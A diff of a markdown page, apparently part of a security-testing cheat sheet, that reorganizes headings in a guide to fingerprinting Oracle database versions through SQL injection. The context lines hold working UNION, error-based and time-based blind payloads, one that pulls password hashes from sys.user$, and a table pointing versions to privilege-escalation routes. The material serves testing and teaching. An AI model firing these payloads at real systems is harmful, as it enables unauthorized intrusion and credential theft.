@@ -7,11 +7,9 @@ tags: ["version", "enumeration", "reconnaissance"]
 lastUpdated: 2025-03-15
 ---
 
-## Testing Version
-
 Identifying the Oracle database version is a crucial first step in SQL injection testing. Different Oracle versions have different features, vulnerabilities, and syntax support, which can significantly impact your testing strategy.
 
-### Version Information Queries
+## Version Information Queries
 
 Oracle provides several ways to retrieve version information:
 
@@ -22,7 +20,7 @@ Oracle provides several ways to retrieve version information:
 | `SELECT * FROM v$version`           | Complete version details         | Multiple rows with component details                                                      |
 | `SELECT BANNER_FULL FROM v$version` | Full version with patches (12c+) | Oracle Database 19c Enterprise Edition Release 19.9.0.0.0 - Production Version 19.9.0.0.0 |
 
-### Basic Version Queries
+## Basic Version Queries
 
 ```sql
 -- Most common method
@@ -35,7 +33,7 @@ SELECT VERSION FROM v$instance
 SELECT BANNER, VERSION, VERSION_FULL, VERSION_LEGACY FROM v$instance
 ```
 
-### Component Version Information
+## Component Version Information
 
 ```sql
 -- Get product component versions
@@ -45,9 +43,9 @@ SELECT * FROM product_component_version
 SELECT * FROM dba_feature_usage_statistics
 ```
 
-### SQL Injection Examples
+## SQL Injection Examples
 
-#### UNION-Based Version Detection
+### UNION-Based Version Detection
 
 ```sql
 -- Basic UNION attack
@@ -57,7 +55,7 @@ SELECT * FROM dba_feature_usage_statistics
 ' UNION SELECT NULL,BANNER,NULL,NULL FROM v$version--
 ```
 
-#### Error-Based Version Detection
+### Error-Based Version Detection
 
 ```sql
 -- Using error messages to extract version
@@ -67,7 +65,7 @@ SELECT * FROM dba_feature_usage_statistics
 ' AND CTXSYS.DRITHSX.SN(1,(SELECT BANNER FROM v$version WHERE ROWNUM=1))=1--
 ```
 
-#### Blind Version Detection
+### Blind Version Detection
 
 For blind SQL injection scenarios, character-by-character extraction:
 
@@ -83,11 +81,11 @@ For time-based blind:
 ' AND (CASE WHEN ASCII(SUBSTR((SELECT BANNER FROM v$version WHERE ROWNUM=1),1,1))=79 THEN dbms_pipe.receive_message('x',10) ELSE NULL END) IS NULL--
 ```
 
-### Version-Specific Testing
+## Version-Specific Testing
 
 Different Oracle versions have different vulnerabilities and features:
 
-#### Oracle 8i (8.1.7) and Earlier
+### Oracle 8i (8.1.7) and Earlier
 
 ```sql
 -- Check for Oracle 8
@@ -97,7 +95,7 @@ Different Oracle versions have different vulnerabilities and features:
 ' UNION SELECT username,password FROM sys.user$--
 ```
 
-#### Oracle 9i (9.0.1 - 9.2.0)
+### Oracle 9i (9.0.1 - 9.2.0)
 
 ```sql
 -- Check for Oracle 9i
@@ -107,7 +105,7 @@ Different Oracle versions have different vulnerabilities and features:
 ' AND (SELECT COUNT(*) FROM all_registry_banners WHERE BANNER LIKE '%9i%')>0--
 ```
 
-#### Oracle 10g (10.1 - 10.2)
+### Oracle 10g (10.1 - 10.2)
 
 ```sql
 -- Check for Oracle 10g
@@ -117,7 +115,7 @@ Different Oracle versions have different vulnerabilities and features:
 ' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='SCHEDULER$_JOB'--
 ```
 
-#### Oracle 11g (11.1 - 11.2)
+### Oracle 11g (11.1 - 11.2)
 
 ```sql
 -- Check for Oracle 11g
@@ -127,7 +125,7 @@ Different Oracle versions have different vulnerabilities and features:
 ' AND (SELECT COUNT(*) FROM v$parameter WHERE name='sec_case_sensitive_logon')>0--
 ```
 
-#### Oracle 12c (12.1 - 12.2)
+### Oracle 12c (12.1 - 12.2)
 
 ```sql
 -- Check for Oracle 12c
@@ -137,7 +135,7 @@ Different Oracle versions have different vulnerabilities and features:
 ' AND (SELECT COUNT(*) FROM v$pdbs)>0--
 ```
 
-#### Oracle 18c/19c/21c
+### Oracle 18c/19c/21c
 
 ```sql
 -- Check for Oracle 19c
@@ -147,7 +145,7 @@ Different Oracle versions have different vulnerabilities and features:
 ' AND (SELECT COUNT(*) FROM v$option WHERE parameter='Autonomous Database')>0--
 ```
 
-### Oracle Edition Detection
+## Oracle Edition Detection
 
 Oracle comes in different editions (Enterprise, Standard, Express):
 
@@ -159,7 +157,7 @@ Oracle comes in different editions (Enterprise, Standard, Express):
 ' AND INSTR(BANNER,'Express')>0--
 ```
 
-### PL/SQL Version Detection
+## PL/SQL Version Detection
 
 PL/SQL version might differ from database version:
 
@@ -168,16 +166,16 @@ PL/SQL version might differ from database version:
 ' UNION SELECT comp_name,version FROM dba_registry WHERE comp_id='CATALOG'--
 ```
 
-### Oracle Application Server Detection
+## Oracle Application Server Detection
 
 ```sql
 -- Check for Oracle Application Server
 ' UNION SELECT comp_name,version FROM dba_registry WHERE comp_id='APEX'--
 ```
 
-### Practical Considerations
+## Practical Considerations
 
-#### Version-based Attack Planning
+### Version-based Attack Planning
 
 Once you know the version, you can plan more targeted attacks:
 
@@ -188,7 +186,7 @@ Once you know the version, you can plan more targeted attacks:
 | 11g     | DBMS_JVM_EXP_PERMS privilege escalation               |
 | 12c+    | More restrictive by default, need targeted approaches |
 
-#### Detection Accuracy
+### Detection Accuracy
 
 Some environments might hide version information:
 
